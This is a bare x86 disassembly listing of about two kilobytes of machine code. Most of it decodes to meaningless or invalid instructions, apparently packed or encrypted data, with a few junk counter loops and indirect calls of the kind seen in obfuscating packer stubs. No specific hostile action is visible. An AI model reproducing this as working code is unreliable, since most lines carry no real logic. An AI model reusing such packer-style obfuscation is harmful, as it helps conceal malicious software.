  40a6e5:	aas    
  40a6e6:	xchg   ecx,eax
  40a6e7:	inc    ebx
  40a6e8:	add    eax,0x9cff3e55
  40a6ed:	adc    BYTE PTR [ebx+0x6cb20bf1],0xe6
  40a6f4:	push   esi
  40a6f5:	pop    ebx
  40a6f7:	loope  0x40a6b6
  40a6f9:	(bad)  
  40a6fa:	mov    edi,0xdea9a228
  40a6ff:	addr16 mov bl,0xa2
  40a702:	pop    esi
  40a703:	mov    ah,0x74
  40a705:	cmp    edx,edi
  40a707:	scas   al,BYTE PTR es:[edi]
  40a708:	and    DWORD PTR [ebx],ecx
  40a70a:	sub    dl,BYTE PTR [edx+0x3c7bfdbe]
  40a710:	pop    esp
  40a711:	xchg   esi,eax
  40a712:	or     dh,BYTE PTR [eax]
  40a714:	loopne 0x40a6d8
  40a716:	sbb    al,BYTE PTR [ebp+edx*4-0x41]
  40a71a:	adc    DWORD PTR [eax+esi*8],ebp
  40a71d:	sub    bh,ah
  40a71f:	js     0x40a73e
  40a721:	mov    ecx,0xd544094d
  40a726:	int    0x85
  40a728:	mov    ecx,0xba725c6c
  40a72d:	or     eax,0x2cf98a9a
  40a732:	shl    BYTE PTR [ecx-0x1],0x28
  40a736:	dec    ebp
  40a737:	mov    cl,0xd9
  40a739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a73a:	push   ebx
  40a73b:	in     eax,0x61
  40a73d:	lahf   
  40a73e:	test   eax,0x453b9cb2
  40a743:	jns    0x40a7ba
  40a745:	sahf   
  40a746:	pop    ebx
  40a747:	mov    eax,ebx
  40a749:	jmp    0x40a6db
  40a74b:	and    al,0x9f
  40a74d:	adc    BYTE PTR [ebx+ebx*1],bl
  40a750:	xchg   edx,eax
  40a751:	leave  
  40a752:	push   ss
  40a753:	inc    ecx
  40a754:	or     esp,ebx
  40a756:	xchg   esi,eax
  40a757:	retf   
  40a758:	sbb    BYTE PTR [edx],ah
  40a75a:	add    DWORD PTR [edx-0x32048a43],edi
  40a760:	dec    ebx
  40a761:	or     eax,0x288d57af
  40a766:	xchg   esp,eax
  40a767:	call   0xf6f8:0x92b45006
  40a76e:	daa    
  40a76f:	jl     0xfd7c
  40a774:	loope  0x40a76d
  40a776:	hlt    
  40a777:	aam    0xa7
  40a779:	repnz (bad) 
  40a77c:	inc    ebx
  40a77d:	out    0x9c,al
  40a77f:	jg     0x40a7df
  40a781:	scas   al,BYTE PTR es:[edi]
  40a782:	enter  0x9cee,0xa9
  40a786:	sbb    BYTE PTR [ebx+0x7c3cca99],al
  40a78c:	je     0x40a787
  40a78e:	push   ds
  40a78f:	jne    0x40a75f
  40a791:	adc    ch,bl
  40a793:	push   esp
  40a794:	xor    al,0x13
  40a797:	popa   
  40a798:	push   esp
  40a799:	iret   
  40a79a:	xchg   ebx,eax
  40a79b:	xor    DWORD PTR [edx],esp
  40a79d:	nop
  40a79e:	mov    ds:0x43bf5ea3,eax
  40a7a3:	ds ss dec ebp
  40a7a6:	add    DWORD PTR [edi],ebx
  40a7a8:	jnp    0x40a779
  40a7aa:	sub    ebp,DWORD PTR [ecx+0x22]
  40a7ad:	jmp    0x40a761
  40a7af:	stc    
  40a7b0:	lahf   
  40a7b1:	aam    0x5d
  40a7b3:	adc    esp,edx
  40a7b5:	test   al,0x3f
  40a7b7:	xchg   BYTE PTR [edi],ch
  40a7b9:	daa    
  40a7ba:	adc    DWORD PTR [esi],0x6f
  40a7bd:	in     al,0xc0
  40a7bf:	xchg   ebx,eax
  40a7c0:	inc    esi
  40a7c1:	dec    ebx
  40a7c2:	jmp    0xae28eb65
  40a7c7:	mov    bh,0xc3
  40a7c9:	test   DWORD PTR [ebp+0x5e236b21],esp
  40a7cf:	js     0x40a7ce
  40a7d1:	cli    
  40a7d2:	daa    
  40a7d3:	xor    al,0x53
  40a7d5:	inc    ebx
  40a7d6:	adc    al,0xae
  40a7d8:	enter  0x92d7,0xc7
  40a7dc:	mov    dl,0x18
  40a7de:	dec    ecx
  40a7df:	adc    eax,0x8cc9034d
  40a7e5:	pop    edx
  40a7e6:	int    0x46
  40a7e8:	inc    esp
  40a7e9:	push   ss
  40a7ea:	xor    edx,DWORD PTR ds:0x2f2ea79b
  40a7f0:	test   BYTE PTR [eax],dh
  40a7f2:	test   BYTE PTR [edi+0x8914936],0x2
  40a7f9:	jbe    0x40a873
  40a7fb:	sbb    edi,DWORD PTR [eax-0x3a]
  40a7fe:	or     esp,DWORD PTR [eax]
  40a800:	xor    dl,cl
  40a802:	nop
  40a803:	or     dl,BYTE PTR [ecx+ecx*2+0x316e1c6d]
  40a80a:	daa    
  40a80b:	xchg   edi,eax
  40a80c:	in     eax,dx
  40a80d:	fistp  QWORD PTR [ecx-0x6a]
  40a810:	mov    ebx,0x852102a3
  40a815:	push   edx
  40a816:	cmp    al,0x7c
  40a818:	xor    DWORD PTR [ebx-0x76],ebx
  40a81b:	xor    eax,0x1a35bb4e
  40a820:	call   DWORD PTR [eax+0x75d45f76]
  40a826:	push   ecx
  40a827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a828:	data16 aaa 
  40a82a:	mov    ebx,0xb601350f
  40a82f:	xor    eax,0x31dd0722
  40a834:	aas    
  40a835:	bound  esi,QWORD PTR [ecx]
  40a837:	inc    esi
  40a838:	stos   BYTE PTR es:[edi],al
  40a839:	pop    ecx
  40a83a:	and    eax,esi
  40a83c:	push   ebx
  40a83d:	icebp  
  40a83e:	mov    eax,0x3a720222
  40a843:	sbb    edi,ebx
  40a845:	(bad)  
  40a846:	xchg   esi,eax
  40a847:	ins    BYTE PTR es:[edi],dx
  40a848:	(bad)  
  40a849:	ins    DWORD PTR es:[edi],dx
  40a84a:	cmc    
  40a84b:	jne    0x40a857
  40a84d:	lea    eax,[ebp-0x18]
  40a850:	mov    DWORD PTR [ebp-0x24],eax
  40a853:	xor    DWORD PTR ds:0x4302dd,0x5f13
  40a85d:	mov    eax,DWORD PTR [ebp-0x18]
  40a860:	and    DWORD PTR ds:0x4302e9,0x0
  40a86a:	jmp    0x40a87c
  40a86f:	mov    ebx,DWORD PTR ds:0x4302e9
  40a875:	inc    ebx
  40a876:	mov    DWORD PTR ds:0x4302e9,ebx
  40a87c:	cmp    DWORD PTR ds:0x4302e9,0x10
  40a883:	jae    0x40a8ac
  40a889:	cmp    DWORD PTR ds:0x4302e9,0x13
  40a890:	jne    0x40a8a1
  40a896:	push   0x42e77b
  40a89b:	call   DWORD PTR ds:0x42eabf
  40a8a1:	jmp    0x40a86f
  40a8a6:	and    DWORD PTR ds:0x4302e5,edx
  40a8ac:	mov    ecx,DWORD PTR [ebp-0x24]
  40a8af:	xor    eax,esi
  40a8b1:	add    DWORD PTR ds:0x43036b,0x2a87
  40a8bb:	add    eax,edi
  40a8bd:	sub    ebx,DWORD PTR ds:0x4302ed
  40a8c3:	mov    DWORD PTR [ecx],eax
  40a8c5:	and    DWORD PTR ds:0x42e654,0x0
  40a8cf:	jmp    0x40a8e1
  40a8d4:	mov    ebx,DWORD PTR ds:0x42e654
  40a8da:	inc    ebx
  40a8db:	mov    DWORD PTR ds:0x42e654,ebx
  40a8e1:	cmp    DWORD PTR ds:0x42e654,0x1d
  40a8e8:	jae    0x40ac77
  40a8ee:	cmp    DWORD PTR ds:0x42e654,0x11
  40a8f5:	jne    0x40a90b
  40a8fb:	push   0x2475
  40a900:	push   0x8142
  40a905:	call   DWORD PTR ds:0x42e887
  40a90b:	cmp    DWORD PTR ds:0x42e654,0x10
  40a912:	jne    0x40a925
  40a918:	mov    ebx,DWORD PTR ds:0x42e654
  40a91e:	inc    ebx
  40a91f:	mov    DWORD PTR ds:0x42e654,ebx
  40a925:	jmp    0x40a8d4
  40a92a:	jmp    0x40ac77
  40a92f:	fsubr  QWORD PTR [esi-0x17]
  40a932:	or     eax,0x6fd88969
  40a937:	pop    eax
  40a938:	or     BYTE PTR [edx-0x4471bb87],bl
  40a93e:	push   ds
  40a93f:	cdq    
  40a940:	loope  0x40a9c0
  40a942:	jle    0x40a972
  40a944:	jge    0x40a9c4
  40a946:	jle    0x40a940
  40a948:	into   
  40a949:	icebp  
  40a94a:	popf   
  40a94b:	cmp    al,0xb9
  40a94d:	jg     0x40a982
  40a94f:	jmp    0x40a8e1
  40a951:	push   ebx
  40a952:	aas    
  40a953:	(bad)  
  40a954:	dec    ecx
  40a955:	stos   BYTE PTR es:[edi],al
  40a956:	pop    ebx
  40a957:	rol    BYTE PTR [edi+0x29],1
  40a95a:	ins    BYTE PTR es:[edi],dx
  40a95b:	push   ebp
  40a95c:	xchg   ebp,eax
  40a95d:	sub    BYTE PTR [ecx],cl
  40a95f:	ret    0x259b
  40a962:	loopne 0x40a8eb
  40a964:	test   eax,0xcb086125
  40a969:	js     0x40a966
  40a96b:	call   0x22e51430
  40a970:	push   0xd6dc077c
  40a975:	pop    ss
  40a976:	dec    edi
  40a977:	and    BYTE PTR [ebp+0x22],cl
  40a97a:	add    DWORD PTR [ebx],eax
  40a97c:	cmp    ebp,DWORD PTR [ecx-0x3db3f7e8]
  40a982:	mov    eax,0xb524558d
  40a987:	and    DWORD PTR [eax-0x38],edx
  40a98a:	or     eax,0xe037815a
  40a98f:	daa    
  40a990:	mov    al,ds:0x5688651a
  40a995:	lea    ebp,[ebx]
  40a997:	out    dx,al
  40a998:	aas    
  40a999:	and    edi,DWORD PTR [ebp-0x1d]
  40a99c:	in     eax,dx
  40a99d:	xchg   DWORD PTR [eax+esi*8],edx
  40a9a0:	fs ss lahf 
  40a9a3:	sbb    esp,DWORD PTR [ebx+0x49e8d704]
  40a9a9:	mov    edi,0x6b62f02c
  40a9ae:	pusha  
  40a9af:	and    eax,0x8d76ce6c
  40a9b4:	sub    ah,dl
  40a9b6:	ret    
  40a9b7:	aaa    
  40a9b8:	mov    al,ds:0xa84743d4
  40a9bd:	adc    DWORD PTR [edi],esp
  40a9bf:	repz (bad) 
  40a9c1:	mov    ecx,0x3aa42c67
  40a9c6:	inc    ebp
  40a9c7:	in     al,dx
  40a9c8:	test   BYTE PTR [esi],cl
  40a9ca:	or     bh,BYTE PTR [eax]
  40a9cc:	adc    DWORD PTR [edx+edi*1],0x389019c8
  40a9d3:	xor    DWORD PTR [ecx+edi*1-0x975795c],ebp
  40a9da:	adc    ah,BYTE PTR [ecx]
  40a9dc:	jge    0x40a97c
  40a9de:	in     eax,dx
  40a9df:	(bad)  
  40a9e0:	mov    eax,ds:0xce22bd85
  40a9e5:	mov    edx,0xd3d0fa97
  40a9ea:	lea    edi,[edx-0x76afb37f]
  40a9f0:	jle    0x40aa64
  40a9f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9f3:	nop
  40a9f4:	push   ebx
  40a9f5:	aam    0x2d
  40a9f7:	jl     0x40aa77
  40a9f9:	adc    BYTE PTR [ebp-0x3a],al
  40a9fc:	imul   eax,DWORD PTR [edx+0x4],0x9b5e3e06
  40aa03:	in     eax,dx
  40aa04:	adc    al,0xb8
  40aa06:	repz inc edx
  40aa08:	leave  
  40aa09:	jno    0x40aa19
  40aa0b:	sub    BYTE PTR [ecx],al
  40aa0d:	outs   dx,DWORD PTR ds:[esi]
  40aa0e:	jl     0x40a9f5
  40aa10:	js     0x40aa24
  40aa12:	lahf   
  40aa13:	jmp    0x47577743
  40aa18:	add    BYTE PTR [eax+ebp*1+0x5a],ah
  40aa1c:	adc    cl,BYTE PTR [ebx-0x4cc23e96]
  40aa22:	pop    ebp
  40aa23:	call   0x2e3c97f
  40aa28:	jbe    0x40a9ac
  40aa2a:	xor    cl,BYTE PTR [esi+0x44]
  40aa2d:	sti    
  40aa2e:	mov    edi,0xc0d0bf8
  40aa33:	add    al,0xb8
  40aa35:	cs and eax,0x4125db2a
  40aa3b:	ror    BYTE PTR [esi],0x9f
  40aa3e:	dec    edx
  40aa3f:	or     BYTE PTR [esi],cl
  40aa41:	add    eax,0x272efbac
  40aa46:	test   ecx,0x397fe4c4
  40aa4c:	cs xchg esi,eax
  40aa4e:	mov    ds:0x266714a1,eax
  40aa53:	in     eax,dx
  40aa54:	and    eax,0xf51720d0
  40aa59:	xlat   BYTE PTR ds:[ebx]
  40aa5a:	cmp    eax,0xe354c929
  40aa5f:	jmp    0x40aa24
  40aa61:	push   edx
  40aa62:	fiadd  WORD PTR [edi+ebx*2+0x5c]
  40aa66:	and    dh,BYTE PTR [ebx+0x3b32fb2]
  40aa6c:	mov    cl,0x45
  40aa6e:	push   0x46
  40aa70:	add    DWORD PTR [ebx],edx
  40aa72:	jo     0x40aa66
  40aa74:	sbb    BYTE PTR [ecx-0x49],bl
  40aa77:	stos   DWORD PTR es:[edi],eax
  40aa78:	add    eax,0x93312708
  40aa7d:	xor    BYTE PTR [esi+0xd],ch
  40aa80:	mov    WORD PTR [ebx-0x5],ss
  40aa83:	mov    eax,ds:0x6b4d99d0
  40aa88:	loop   0x40ab06
  40aa8a:	outs   dx,BYTE PTR ds:[esi]
  40aa8b:	dec    ecx
  40aa8c:	mov    al,ds:0x70103130
  40aa91:	loope  0x40aa48
  40aa93:	sub    BYTE PTR [esp],cl
  40aa96:	sub    DWORD PTR [edi],edi
  40aa98:	pop    es
  40aa99:	pop    ds
  40aa9a:	dec    esp
  40aa9b:	xor    BYTE PTR [ecx+0x21],bl
  40aa9e:	outs   dx,BYTE PTR ds:[esi]
  40aa9f:	es xor eax,0xccb2c9b8
  40aaa5:	pop    ds
  40aaa6:	lahf   
  40aaa7:	frstor [eax+0x5e]
  40aaaa:	test   BYTE PTR [eax+0x17],bh
  40aaad:	daa    
  40aaae:	inc    esp
  40aaaf:	inc    edx
  40aab0:	xchg   esp,eax
  40aab1:	shl    DWORD PTR es:[ecx+0x3dea2866],1
  40aab8:	out    0xe9,al
  40aaba:	mov    BYTE PTR [ebx-0x2d28230],bh
  40aac0:	xchg   esp,eax
  40aac1:	aam    0xb7
  40aac3:	loop   0x40aa9c
  40aac5:	ffreep st(4)
  40aac7:	mov    esp,0xb97c6e3
  40aacc:	(bad)  
  40aacd:	lock rcr DWORD PTR [esi+0x1d],cl
  40aad1:	shl    DWORD PTR [eax+0x1c],0x1e
  40aad5:	mov    ecx,0x4acfc18
  40aada:	jb     0x40ab29
  40aadc:	jns    0x40aafa
  40aade:	(bad)  
  40aae0:	ins    BYTE PTR es:[edi],dx
  40aae1:	pop    edx
  40aae2:	mov    dh,0x4f
  40aae4:	push   0xb
  40aae6:	xchg   esi,eax
  40aae7:	jo     0x40ab5c
  40aae9:	push   edi
  40aaea:	xchg   BYTE PTR ds:0xb9d680f8,bh
  40aaf0:	jb     0x40ab16
  40aaf2:	sub    BYTE PTR [ebx+0x3],0x8a
  40aaf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aaf7:	push   ebx
  40aaf8:	test   eax,0x30bb47d5
  40aafd:	sub    eax,0x560a4e4f
  40ab02:	arpl   WORD PTR [edx+0x33],di
  40ab05:	jnp    0x40ab44
  40ab07:	mov    bl,0xcf
  40ab09:	ja     0x40aacd
  40ab0b:	out    dx,eax
  40ab0c:	push   ds
  40ab0d:	(bad)  
  40ab0e:	out    0xc7,al
  40ab10:	ins    DWORD PTR es:[edi],dx
  40ab11:	or     BYTE PTR [ebp-0x48b19848],ah
  40ab17:	scas   al,BYTE PTR es:[edi]
  40ab18:	fst    st(2)
  40ab1a:	fist   DWORD PTR [eax]
  40ab1c:	int    0x9b
  40ab1e:	inc    ecx
  40ab1f:	retf   0xfcfe
  40ab22:	add    ebx,DWORD PTR [edi-0x1cc3a837]
  40ab28:	dec    edx
  40ab29:	pop    edx
  40ab2a:	popa   
  40ab2b:	sti    
  40ab2c:	popf   
  40ab2d:	mov    DWORD PTR [ecx+0x4290fbb4],edi
  40ab33:	or     eax,0x7288e64d
  40ab38:	aaa    
  40ab39:	sub    al,0xc9
  40ab3b:	mov    ebx,0x27c06c00
  40ab40:	xchg   ebp,edi
  40ab42:	add    al,0x30
  40ab44:	mov    eax,ds:0x1c28deb0
  40ab49:	addr16 xor eax,0x61d98564
  40ab4f:	adc    DWORD PTR [esi+0x62],edi
  40ab52:	jmp    0x3f94:0xf7223391
  40ab59:	hlt    
  40ab5a:	sub    ebx,edi
  40ab5c:	retf   
  40ab5d:	mov    esp,0xdb1b3be
  40ab62:	xchg   ebp,eax
  40ab63:	and    cl,0x30
  40ab66:	(bad)  
  40ab67:	jp     0x40abbb
  40ab69:	sub    al,bl
  40ab6b:	add    eax,0x4ba000b3
  40ab70:	bound  ecx,QWORD PTR [edi]
  40ab72:	dec    edx
  40ab73:	add    ah,BYTE PTR [edx]
  40ab75:	mov    esi,0xc3c60fab
  40ab7a:	lds    esp,FWORD PTR [eax+0x63]
  40ab7d:	(bad)  
  40ab7e:	out    0xf7,eax
  40ab80:	cmp    cl,BYTE PTR [esi+0x6e6d6a2c]
  40ab86:	cmp    eax,0x2293b8f4
  40ab8b:	daa    
  40ab8c:	add    cl,ch
  40ab8e:	add    dh,BYTE PTR [edi-0x68050b4c]
  40ab94:	out    dx,al
  40ab95:	pop    ss
  40ab96:	and    eax,0x6e30df7
  40ab9b:	xor    edx,DWORD PTR [ebx+0x5653657f]
  40aba1:	test   DWORD PTR [edx+0x38],edi
  40aba4:	ins    DWORD PTR es:[edi],dx
  40aba5:	test   al,0x20
  40aba7:	xchg   ecx,eax
  40aba8:	aam    0xe7
  40abaa:	mov    ds:0x838d9ef7,eax
  40abaf:	sbb    al,0xc
  40abb1:	mov    eax,ds:0x1ab4d7bb
  40abb6:	sub    al,0xf2
  40abb8:	mov    ah,0x57
  40abba:	cmp    DWORD PTR [ecx+0x37],esp
  40abbd:	mov    cl,0xcf
  40abbf:	js     0x40ac13
  40abc1:	std    
  40abc2:	jo     0x40abb3
  40abc4:	in     al,0xe6
  40abc6:	shl    DWORD PTR [ecx+0x4b653af5],1
  40abcc:	mov    bh,0x32
  40abce:	sbb    BYTE PTR [esi],0x41
  40abd1:	xchg   esi,eax
  40abd2:	fs popf 
  40abd4:	dec    esp
  40abd5:	cld    
  40abd6:	fistp  QWORD PTR [edi+0x384a3a75]
  40abdc:	mov    BYTE PTR [ecx-0x1f],bh
  40abdf:	(bad)  
  40abe0:	retf   
  40abe1:	fscale 
  40abe3:	(bad)  
  40abe4:	sbb    ebx,DWORD PTR [edx]
  40abe6:	dec    esi
  40abe7:	je     0x40ab92
  40abe9:	cmp    BYTE PTR [ecx+ebp*4],bl
  40abec:	mov    edx,0x37a896ed
  40abf1:	mov    bl,0xf2
  40abf3:	call   0xc31f:0x9c7c0c4c
  40abfa:	test   al,0xee
  40abfc:	dec    esp
  40abfd:	sahf   
  40abfe:	iret   
  40abff:	mov    DWORD PTR [edx-0x72],esi
  40ac02:	ret    0x9f4b
  40ac05:	cmp    al,0x38
  40ac07:	mov    dl,0x26
  40ac09:	fs in  eax,dx
  40ac0b:	mov    bl,0x4b
  40ac0d:	sub    al,BYTE PTR [eax+0x3bd3b37a]
  40ac13:	pushf  
  40ac14:	pushf  
  40ac15:	jbe    0x40abb3
  40ac17:	sub    dl,BYTE PTR [ecx-0x5f11048]
  40ac1d:	add    eax,0xed66568a
  40ac22:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac24:	sbb    bh,BYTE PTR [eax+edx*8+0x6b35f7d4]
  40ac2b:	test   esi,esp
  40ac2d:	(bad)  
  40ac2e:	mov    eax,0x7aedb481
  40ac33:	dec    ebx
  40ac34:	jp     0x40abc2
  40ac36:	sub    eax,0xdb779218
  40ac3b:	into   
  40ac3c:	popf   
  40ac3d:	vmwrite ecx,DWORD PTR [edx-0x54]
  40ac41:	or     eax,0xdeefe62a
  40ac46:	adc    eax,0x8e69c263
  40ac4b:	jle    0x40acb4
  40ac4d:	(bad)  
  40ac4e:	jmp    0x3b34:0xccbc98ec
  40ac55:	popf   
  40ac56:	cld    
  40ac57:	sbb    al,0xe3
  40ac59:	jg     0x40acbe
  40ac5b:	sar    BYTE PTR [esi],1
  40ac5d:	mov    ds:0xd6365457,al
  40ac62:	cmp    BYTE PTR [ecx+0x14],dh
  40ac65:	jmp    0x78dc2f33
  40ac6a:	lea    edi,[ecx+0x1]
  40ac6d:	in     eax,0x9d
  40ac6f:	push   ss
  40ac70:	push   ecx
  40ac71:	(bad)  
  40ac73:	neg    DWORD PTR [eax-0x4f]
  40ac76:	leave  
  40ac77:	mov    eax,ds:0x41227c
  40ac7c:	mov    ebx,0x8e12feb8
  40ac81:	jmp    0x40afce
  40ac86:	leave  
  40ac87:	inc    edx
  40ac88:	mov    ebp,0xd1515553
  40ac8d:	inc    eax
  40ac8e:	xor    ch,ah
  40ac90:	icebp  
  40ac91:	pushf  
  40ac92:	test   eax,0x4939b7f0
  40ac97:	in     al,dx
  40ac98:	jle    0x40ad18
  40ac9a:	cs jge 0x40ad1b
  40ac9d:	jle    0x40acc0
  40ac9f:	out    0x57,eax
  40aca1:	es daa 
  40aca3:	inc    eax
  40aca4:	lea    ebp,[ebx]
  40aca6:	push   DWORD PTR ds:0x2b22aab4
  40acac:	or     eax,0xf9f741c
  40acb1:	mov    ds:0xe81bc8f8,al
  40acb6:	pushf  
  40acb7:	scas   al,BYTE PTR es:[edi]
  40acb8:	push   eax
  40acb9:	push   eax
  40acba:	sub    DWORD PTR [ebp+0x6b3637b4],edx
  40acc0:	xchg   ebp,eax
  40acc1:	hlt    
  40acc2:	inc    esp
  40acc3:	adc    bh,BYTE PTR [eax+ebx*4+0x7594f8f4]
  40acca:	push   edi
  40accb:	call   0xed8d:0x429f2d60
  40acd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acd3:	fsub   st(0),st
  40acd5:	push   0xffffffbc
  40acd7:	or     eax,0xd4e32ce4
  40acdc:	mov    edi,0x5dc6af82
  40ace1:	fcom   QWORD PTR [esi]
  40ace3:	cli    
  40ace4:	ja     0x40ad2d
  40ace6:	xlat   BYTE PTR ds:[ebx]
  40ace7:	ds imul edx,ebp,0x78a45fd0
  40acee:	cdq    
  40acef:	mov    cl,0x82
  40acf1:	xchg   edi,ebx
  40acf3:	mov    esi,0x6243f2fe
  40acf8:	ds pop edx
  40acfa:	into   
  40acfb:	dec    eax
  40acfc:	call   0x1abef60a
  40ad01:	jo     0x40ad3f
  40ad03:	cmp    DWORD PTR [edi-0xb],edx
  40ad06:	loopne 0x40ac8b
  40ad08:	fisttp QWORD PTR [eax-0x50339c4f]
  40ad0e:	leave  
  40ad0f:	es mov ebp,0xf57ade3d
  40ad15:	and    BYTE PTR [ebx-0xf],dl
  40ad18:	(bad)  
  40ad19:	push   ss
  40ad1a:	xlat   BYTE PTR ds:[ebx]
  40ad1b:	fdiv   QWORD PTR [esi-0x12]
  40ad1e:	leave  
  40ad1f:	cmp    eax,0xc71af12f
  40ad24:	shr    DWORD PTR [edi+0x545d578e],cl
  40ad2a:	arpl   WORD PTR [esi-0x1f0c7308],sp
  40ad30:	mov    WORD PTR [ebx+ebx*8-0x62edaee8],es
  40ad37:	mov    ebx,0xf88cb396
  40ad3c:	popa   
  40ad3d:	call   0x3a60:0x9dca0bbc
  40ad44:	(bad)  
  40ad45:	dec    esp
  40ad46:	std    
  40ad47:	test   DWORD PTR [eax-0x4f],0xa956bd87
  40ad4e:	mov    WORD PTR [ebx],ds
  40ad50:	adc    eax,0x63fd720d
  40ad55:	adc    al,0x2b
  40ad57:	rcl    BYTE PTR [edx+0x3],1
  40ad5a:	aas    
  40ad5b:	sub    DWORD PTR [edi-0x57],0xffffffed
  40ad5f:	add    al,0x94
  40ad61:	inc    edi
  40ad62:	mov    ch,0x36
  40ad64:	out    dx,al
  40ad65:	sub    al,0x4f
  40ad67:	rol    BYTE PTR [eax+0x2a],0xbd
  40ad6b:	ins    DWORD PTR es:[edi],dx
  40ad6c:	fld    TBYTE PTR [edx+0x541fcaf9]
  40ad72:	xchg   eax,esp
  40ad74:	fxch   st(3)
  40ad76:	nop
  40ad77:	fdivr  st(6),st
  40ad79:	inc    eax
  40ad7a:	hlt    
  40ad7b:	push   ebx
  40ad7c:	and    al,0x8d
  40ad7e:	sahf   
  40ad7f:	adc    ebp,DWORD PTR [edx+0x2dc2ba65]
  40ad85:	mov    ss,WORD PTR [esi]
  40ad87:	dec    edx
  40ad88:	mov    ch,0x9a
  40ad8a:	or     cl,BYTE PTR [ebp-0x175ad55c]
  40ad90:	loop   0x40adf1
  40ad92:	enter  0x5688,0x44
  40ad96:	dec    ebp
  40ad97:	adc    BYTE PTR [edx-0xe],bl
  40ad9a:	cmp    al,0x67
  40ad9c:	cwde   
  40ad9d:	add    BYTE PTR [ebp+0x7cb632c8],ch
  40ada3:	xor    al,0x81
  40ada5:	push   ebp
  40ada6:	mov    dh,0x27
  40ada8:	inc    eax
  40ada9:	mov    ds:0xf96222c7,eax
  40adae:	arpl   WORD PTR [edi],di
  40adb0:	add    esp,DWORD PTR [esp+ebx*1-0x54731def]
  40adb7:	sub    ch,BYTE PTR [edx-0x3be467a4]
  40adbd:	sub    al,0xa4
  40adbf:	and    bh,BYTE PTR [esi+0x5c5054a2]
  40adc5:	mov    bh,BYTE PTR [esi+ebp*8]
  40adc8:	or     ebx,DWORD PTR [edi+0x4a]
  40adcb:	mov    eax,0x98e3236e
  40add0:	pop    ecx
  40add1:	and    al,0x17
  40add3:	xlat   BYTE PTR ds:[ebx]
  40add4:	call   0xa4e88243
  40add9:	xlat   BYTE PTR ds:[ebx]
  40adda:	and    eax,0xc1b3cc07
  40addf:	inc    ebp
  40ade0:	out    0xc9,al
  40ade2:	out    dx,al
  40ade3:	mov    cl,BYTE PTR [edi-0x1fa50a5f]
  40ade9:	mov    bl,0xb0
  40adeb:	dec    edx
  40adec:	and    eax,0xbb155fe6
  40adf1:	cdq    
  40adf2:	fmul   QWORD PTR [eax+edi*1+0x9801d89]
  40adf9:	(bad)  
  40adfb:	jp     0x40ae5e
  40adfd:	mov    ebp,0x2adacfde
  40ae02:	inc    eax
  40ae03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae04:	cwde   
  40ae05:	sub    DWORD PTR [eax-0x2601df05],ecx
  40ae0b:	mov    ebp,0xe8cab262
  40ae10:	cwde   
  40ae11:	jl     0x40adda
  40ae13:	das    
  40ae14:	scas   al,BYTE PTR es:[edi]
  40ae15:	sub    DWORD PTR [ecx-0x3],0x68
  40ae19:	add    ebx,edi
  40ae1b:	ret    0x4ad0
  40ae1e:	popf   
  40ae1f:	inc    edi
  40ae20:	ficomp WORD PTR ds:0x8d152590
  40ae26:	cli    
  40ae27:	sbb    dl,al
  40ae29:	adc    eax,0x23f800d6
  40ae2e:	mov    edi,DWORD PTR [eax+0x8]
  40ae31:	cld    
  40ae32:	and    BYTE PTR [ebx+edi*4],0x61
  40ae36:	into   
  40ae37:	cmp    al,0xb6
  40ae39:	jle    0x40aeb6
  40ae3b:	hlt    
  40ae3c:	push   ecx
  40ae3d:	aaa    
  40ae3e:	xchg   ecx,eax
  40ae3f:	(bad)  
  40ae40:	sbb    esi,DWORD PTR [eax+0x18290b5a]
  40ae46:	jo     0x40ae89
  40ae48:	sub    DWORD PTR [edi],edi
  40ae4a:	xor    ch,al
  40ae4c:	arpl   WORD PTR [edx-0x54],bx
  40ae4f:	js     0x40adf7
  40ae51:	js     0x40adec
  40ae53:	and    BYTE PTR [edx+0x77c2f3dd],ch
  40ae59:	ins    DWORD PTR es:[edi],dx
  40ae5a:	xor    eax,edx
  40ae5c:	mov    al,ds:0xb7940713
  40ae61:	fdivp  st(3),st
  40ae63:	jmp    0x40ae0a
  40ae65:	or     DWORD PTR [ebp-0x7a],esi
  40ae68:	jle    0x40aea5
  40ae6a:	and    al,BYTE PTR [edi+0x71]
  40ae6d:	cmp    bh,BYTE PTR [eax-0x5ed49b96]
  40ae73:	sbb    al,0x1a
  40ae76:	rcl    ebx,0x79
  40ae79:	in     al,dx
  40ae7a:	mov    al,0x8b
  40ae7c:	push   eax
  40ae7d:	xchg   esp,eax
  40ae7e:	pop    ds
  40ae7f:	adc    edi,esi
  40ae81:	mov    dl,0xa4
  40ae83:	sub    BYTE PTR [edx],bl
  40ae85:	sbb    al,0xf4
  40ae87:	scas   al,BYTE PTR es:[edi]
  40ae88:	sbb    DWORD PTR [edx+0x88fa357],ebx
  40ae8e:	arpl   WORD PTR [edi+ebx*2+0x74],si
  40ae92:	inc    ebp
  40ae93:	and    BYTE PTR [edi+0x7e9abae3],bh
  40ae99:	popf   
  40ae9a:	sahf   
  40ae9b:	fcomp  QWORD PTR ds:0xf3773f16
  40aea1:	and    ecx,DWORD PTR [ecx+0xd]
  40aea4:	cmp    edx,esp
  40aea6:	(bad)  
  40aea7:	sbb    ch,cl
  40aea9:	je     0x40af10
  40aeab:	mov    ah,0xd1
  40aead:	sbb    eax,0xf0095323
  40aeb2:	aam    0xbf
  40aeb4:	jp     0x40aee6
  40aeb6:	lahf   
  40aeb7:	in     eax,dx
  40aeb8:	lock or ebp,ebp
  40aebb:	push   0xe
  40aebd:	ins    BYTE PTR es:[edi],dx
  40aebe:	mov    ebx,0x51751744
  40aec3:	(bad)  
  40aec4:	popf   
  40aec5:	rol    BYTE PTR [edx],cl
  40aec7:	add    al,0x67
  40aec9:	test   al,0xd6
  40aecb:	mov    edi,0x2059a422
  40aed0:	cmp    edx,DWORD PTR ds:0x56e60710
  40aed6:	lahf   
  40aed7:	push   eax
  40aed8:	and    eax,0x2390ba1e
  40aedd:	push   ecx
  40aede:	push   ebx
  40aedf:	aas    
  40aee0:	jne    0x40af22
  40aee2:	jbe    0x40af4c
  40aee4:	mov    ch,0x88
  40aee6:	das    
  40aee7:	xor    DWORD PTR [ebx-0x7b],ecx
  40aeea:	stc    
